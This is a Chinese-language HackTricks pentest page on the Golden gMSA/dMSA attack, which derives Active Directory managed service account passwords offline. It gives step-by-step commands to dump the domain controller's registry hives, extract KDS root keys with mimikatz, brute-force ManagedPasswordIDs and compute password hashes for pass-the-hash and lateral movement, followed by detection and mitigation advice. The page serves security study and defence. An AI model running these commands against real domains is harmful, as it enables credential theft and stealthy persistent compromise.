# Golden gMSA/dMSA 攻击（托管服务账户密码的离线推导）

{{#include ../../banners/hacktricks-training.md}}

## 概述

Windows 托管服务账户（MSA）是专门设计用于运行服务的特殊主体，无需手动管理其密码。
主要有两种类型：

1. **gMSA** – 组托管服务账户 – 可以在其 `msDS-GroupMSAMembership` 属性中授权的多个主机上使用。
2. **dMSA** – 委派托管服务账户 – gMSA 的（预览）继任者，依赖于相同的加密技术，但允许更细粒度的委派场景。

对于这两种变体，**密码不会存储**在每个域控制器（DC）上，就像常规的 NT 哈希一样。相反，每个 DC 可以**动态推导**当前密码，基于：

* 林范围的 **KDS 根密钥** (`KRBTGT\KDS`) – 随机生成的 GUID 命名的秘密，复制到每个 DC 下的 `CN=Master Root Keys,CN=Group Key Distribution Service, CN=Services, CN=Configuration, …` 容器中。
* 目标账户的 **SID**。
* 在 `msDS-ManagedPasswordId` 属性中找到的每个账户的 **ManagedPasswordID**（GUID）。

推导公式为：`AES256_HMAC( KDSRootKey , SID || ManagedPasswordID )` → 240 字节的 blob 最终**进行 base64 编码**并存储在 `msDS-ManagedPassword` 属性中。
在正常密码使用期间，无需 Kerberos 流量或域交互 – 只要成员主机知道这三个输入，就可以在本地推导密码。

## Golden gMSA / Golden dMSA 攻击

如果攻击者能够**离线**获取所有三个输入，他们可以计算出**任何 gMSA/dMSA 的有效当前和未来密码**，而无需再次接触 DC，从而绕过：

* Kerberos 预身份验证 / 票证请求日志
* LDAP 读取审计
* 密码更改间隔（他们可以预先计算）

这类似于服务账户的 *Golden Ticket*。

### 前提条件

1. **一个 DC 的林级别妥协**（或企业管理员）。`SYSTEM` 访问权限足够。
2. 能够枚举服务账户（LDAP 读取 / RID 暴力破解）。
3. .NET ≥ 4.7.2 x64 工作站以运行 [`GoldenDMSA`](https://github.com/Semperis/GoldenDMSA) 或等效代码。

### 第 1 阶段 – 提取 KDS 根密钥

从任何 DC 转储（卷影复制 / 原始 SAM+SECURITY 注册表或远程秘密）：
```cmd
reg save HKLM\SECURITY security.hive
reg save HKLM\SYSTEM  system.hive

# With mimikatz on the DC / offline
mimikatz # lsadump::secrets
mimikatz # lsadump::trust /patch   # shows KDS root keys too
```
标记为 `RootKey`（GUID 名称）的 base64 字符串在后续步骤中是必需的。

### 第 2 阶段 – 枚举 gMSA/dMSA 对象

检索至少 `sAMAccountName`、`objectSid` 和 `msDS-ManagedPasswordId`：
```powershell
# Authenticated or anonymous depending on ACLs
Get-ADServiceAccount -Filter * -Properties msDS-ManagedPasswordId | \
Select sAMAccountName,objectSid,msDS-ManagedPasswordId
```
[`GoldenDMSA`](https://github.com/Semperis/GoldenDMSA) 实现了辅助模式：
```powershell
# LDAP enumeration (kerberos / simple bind)
GoldendMSA.exe info -d example.local -m ldap

# RID brute force if anonymous binds are blocked
GoldendMSA.exe info -d example.local -m brute -r 5000 -u jdoe -p P@ssw0rd
```
### 第3阶段 – 猜测/发现 ManagedPasswordID（当缺失时）

一些部署 *剥离* `msDS-ManagedPasswordId` 以保护 ACL 读取。
由于 GUID 是 128 位的，天真的暴力破解是不可行的，但：

1. 前 **32 位 = 账户创建的 Unix 纪元时间**（分钟分辨率）。
2. 后面跟着 96 位随机位。

因此，每个账户的 **窄词表**（± 几小时）是现实的。
```powershell
GoldendMSA.exe wordlist -s <SID> -d example.local -f example.local -k <KDSKeyGUID>
```
该工具计算候选密码，并将其 base64 blob 与真实的 `msDS-ManagedPassword` 属性进行比较 – 匹配结果揭示了正确的 GUID。

### 第 4 阶段 – 离线密码计算与转换

一旦知道 ManagedPasswordID，有效密码只需一条命令即可获得：
```powershell
# derive base64 password
GoldendMSA.exe compute -s <SID> -k <KDSRootKey> -d example.local -m <ManagedPasswordID>

# convert to NTLM / AES keys for pass-the-hash / pass-the-ticket
GoldendMSA.exe convert -d example.local -u svc_web$ -p <Base64Pwd>
```
生成的哈希可以通过 **mimikatz** (`sekurlsa::pth`) 或 **Rubeus** 注入以滥用 Kerberos，从而实现隐秘的 **横向移动** 和 **持久性**。

## 检测与缓解

* 限制 **DC 备份和注册表 hive 读取** 权限给 Tier-0 管理员。
* 监控 DC 上的 **目录服务恢复模式 (DSRM)** 或 **卷影复制** 创建。
* 审计对 `CN=Master Root Keys,…` 和服务账户的 `userAccountControl` 标志的读取/更改。
* 检测异常的 **base64 密码写入** 或在主机之间突然的服务密码重用。
* 考虑将高权限的 gMSA 转换为 **经典服务账户**，在无法实现 Tier-0 隔离的情况下进行定期随机轮换。

## 工具

* [`Semperis/GoldenDMSA`](https://github.com/Semperis/GoldenDMSA) – 本页面使用的参考实现。
* [`mimikatz`](https://github.com/gentilkiwi/mimikatz) – `lsadump::secrets`，`sekurlsa::pth`，`kerberos::ptt`。
* [`Rubeus`](https://github.com/GhostPack/Rubeus) – 使用派生的 AES 密钥进行票证传递。

## 参考文献

- [Golden dMSA – 委托管理服务账户的身份验证绕过](https://www.semperis.com/blog/golden-dmsa-what-is-dmsa-authentication-bypass/)
- [Semperis/GoldenDMSA GitHub 仓库](https://github.com/Semperis/GoldenDMSA)
- [Improsec – Golden gMSA 信任攻击](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-5-golden-gmsa-trust-attack-from-child-to-parent)

{{#include ../../banners/hacktricks-training.md}}
